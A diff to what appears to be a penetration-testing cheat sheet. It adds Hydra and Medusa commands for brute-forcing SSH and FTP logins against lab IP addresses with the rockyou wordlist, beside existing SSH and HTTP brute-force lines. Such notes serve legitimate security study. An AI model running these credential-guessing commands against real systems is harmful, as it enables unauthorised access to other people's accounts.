@@ -179,7 +179,8 @@ medusa -h <targetip> -u admin -P mutated.txt -M http -n 80 -m DIR:/directory/to/
 
 Hydra
 
-hydra -l wilson -P /usr/share/wordlists/rockyou.txt 192.168.82.47 ssh
+hydra -l wilson -P /usr/share/wordlists/rockyou.txt 192.168.82.47 ssh               #SSH Bruteforcing
+hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.166.56 -s 21         #FTP Bruteforcing
 hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt <targetip> -s 22 ssh -V
 
 # crack web passwords
@@ -193,6 +194,7 @@ hydra -l admin -P /usr/share/seclists/Passwords/10k_most_common.txt <targetip> h
 
 Medusa
 medusa -h <targetip> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/test -T 10
+medusa -h 192.168.166.56 -U users.txt -P /usr/share/wordlists/rockyou.txt -M ftp
 
 -----------------------------------
 
